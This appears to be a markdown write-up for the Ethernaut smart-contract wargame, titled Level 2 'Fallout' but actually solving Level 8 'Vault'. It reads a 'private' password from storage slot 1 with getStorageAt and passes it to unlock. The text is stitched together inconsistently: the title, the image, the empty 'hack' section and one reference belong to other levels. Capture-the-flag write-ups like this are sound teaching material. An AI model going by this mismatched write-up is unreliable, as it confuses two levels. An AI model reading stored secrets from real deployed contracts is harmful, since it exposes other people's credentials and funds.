<div align="center">

<img src="../assets/levels/2-fallout.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 2 - Fallout</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
- [Level 8 - Vault](#level-8---vault)
- [Solution](#solution)
- [Takeaway](#takeaway)
- [References](#references)

## Objectif

<img src="../assets/requirements/2-fallout-requirements.webp" width="800px"/>

## The hack

## Level 8 - Vault

It requires an understanding of how storage works in solidity (usage of 256 bit sized slots) and the JSON RPC function `eth_getStorageAt`

## Solution

Since the contract has a storage variable that stores the password, use `getStorageAt` to get the bytes32 form of the password, and then call the function unlock passing in the password

```
Step 1:
await contract.address;

Step2:
await web3.eth.getStorageAt("[contractAddress]", 1) // 1 because password is in the 2nd slot

Step 3:
await contract.unlock("[result from step 2]")
```

## Takeaway

Not to conflate the meaning of private in solidity vs other languages, existence of `getStorageAt`, how solidity stores state variables

## References

https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_getstorageat
https://www.derekarends.com/solidity-vulnerability-forcibly-sending-ether-to-a-contract/

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
